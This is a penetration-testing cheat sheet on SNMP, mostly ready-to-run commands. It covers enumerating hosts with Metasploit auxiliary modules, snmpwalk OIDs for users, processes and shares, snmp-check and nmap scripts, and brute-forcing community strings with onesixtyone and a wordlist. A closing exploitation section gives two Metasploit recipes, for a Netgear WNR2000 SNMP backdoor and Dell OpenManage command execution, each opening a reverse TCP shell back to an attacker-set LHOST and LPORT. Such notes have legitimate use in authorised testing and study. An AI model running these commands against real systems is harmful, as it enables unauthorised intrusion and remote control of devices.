# SNMP (upd)

## Enumeration
- SNMP 1,2 and 2c traffic is unencrypted
- Community String = Password
	- (RO) for GET is "public"
	- (RW) for SET is "private"

### Metasploit

##### snmp_enum
```bash
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS [IP]
set RPORT 161
set COMMUNITY public
run
```

##### snmp_enumusers
```bash
use auxiliary/scanner/snmp/snmp_enumusers
set RHOSTS [IP]
set RPORT 161
set COMMUNITY public
run
```

##### snmp_enumshares
```bash
use auxiliary/scanner/snmp/snmp_enumshares
set RHOSTS [IP]
set RPORT 161
set COMMUNITY public
run
```

##### snmp_login
```bash
use auxiliary/scanner/snmp/snmp_login
set RHOSTS [IP]
set RPORT 161
set COMMUNITY_FILE /usr/share/seclists/Discovery/SNMP/snmp-comm.txt
run
```

##### snmp_enumsoftware
```bash
use auxiliary/scanner/snmp/snmp_enumsoftware
set RHOSTS [IP]
set RPORT 161
set COMMUNITY public
run
```

### Manual Tools

##### SNMPWALK Common OIDs
- 1.3.6.1.2.1.25.1.6.0 System Processes 
- 1.3.6.1.2.1.25.4.2.1.2 Running Programs 
- 1.3.6.1.2.1.25.4.2.1.4 Processes Path 
- 1.3.6.1.2.1.25.2.3.1.4 Storage Units 
- 1.3.6.1.2.1.25.6.3.1.2 Software Name 
- 1.3.6.1.4.1.77.1.2.25 User Accounts 
- 1.3.6.1.2.1.6.13.1.3 TCP Local Ports 
- 1.3.6.1.2.1.1.5 Hostnames 
- 1.3.6.1.4.1.77.1.4.2 Domain Name 
- 1.3.6.1.4.1.77.1.2.27 Share Information
##### snmpwalk (general SNMP enumeration)
```bash
snmpwalk -v 2c -c public [IP]
```

##### snmpwalk (specific OID)
```bash
snmpwalk -v 2c -c public [IP] 1.3.6.1.2.1.1
```

##### snmp-check
```bash
snmp-check [IP]
```
```bash
snmp-check -c public -v 1 [IP]
```

##### onesixtyone (community string brute-force)
```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-comm.txt [IP]
```

#### NMap

##### Enumeration
```bash
nmap [IP] -p 161,162 -sU --open -vvv -o [OUTPUT_FILE]

```

##### Enumeration + Scripts
```bash
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes,snmp-info [IP]
```


---
---


## Exploitation

### Metasploit

##### netgear_wnr2000_snmp_backdoor
```bash
use exploit/linux/snmp/netgear_wnr2000_snmp_backdoor
set RHOSTS [IP]
set RPORT 161
set PAYLOAD linux/mipsbe/shell_reverse_tcp
set LHOST [IP]
set LPORT [port]
run
```

##### dell_openmanage_exec
```bash
use exploit/linux/snmp/dell_openmanage_exec
set RHOSTS [IP]
set RPORT 161
set COMMUNITY public
set PAYLOAD linux/x86/shell_reverse_tcp
set LHOST [IP]
set LPORT [port]
run
```
